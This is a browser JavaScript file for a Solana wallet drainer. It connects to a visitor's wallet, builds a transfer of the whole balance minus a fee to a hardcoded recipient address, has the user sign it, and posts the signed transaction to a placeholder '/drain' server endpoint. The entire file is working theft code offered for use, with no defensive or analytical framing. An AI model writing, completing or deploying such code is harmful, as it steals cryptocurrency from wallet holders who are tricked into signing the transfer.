const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;
let publicKey;
const connection = new Connection('https://api.mainnet-beta.solana.com');

document.getElementById('connect-wallet').addEventListener('click', async () => {
    if (window.solana) {
        try {
            const response = await window.solana.connect();
            publicKey = response.publicKey;
            alert(`Connected to wallet: ${publicKey.toString()}`);
            document.getElementById('drain-wallet').disabled = false;
        } catch (err) {
            console.error(err);
            alert('Failed to connect to wallet');
        }
    } else {
        alert('Solana wallet not found. Please install a wallet like Phantom.');
    }
});

document.getElementById('drain-wallet').addEventListener('click', async () => {
    if (!publicKey) {
        alert('Please connect your wallet first!');
        return;
    }

    try {
        const balance = await connection.getBalance(publicKey);
        const lamportsToSend = balance - 5000; // Вычитаем комиссию за транзакцию

        if (lamportsToSend <= 0) {
            throw new Error('Insufficient funds to cover the transaction fee');
        }

        const drainerPubkey = new PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: publicKey,
                toPubkey: drainerPubkey,
                lamports: lamportsToSend,
            })
        );

        const signedTransaction = await window.solana.signTransaction(transaction);
        const response = await fetch('https://<your-netlify-url>/drain', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ signedTransaction: signedTransaction.serialize().toString('base64') })
        });

        const result = await response.json();
        if (response.ok) {
            alert('Transaction sent: ' + result.signature);
        } else {
            throw new Error(result.error);
        }
    } catch (error) {
        console.error('Transaction failed', error);
        alert('Transaction failed: ' + error.message);
    }
});
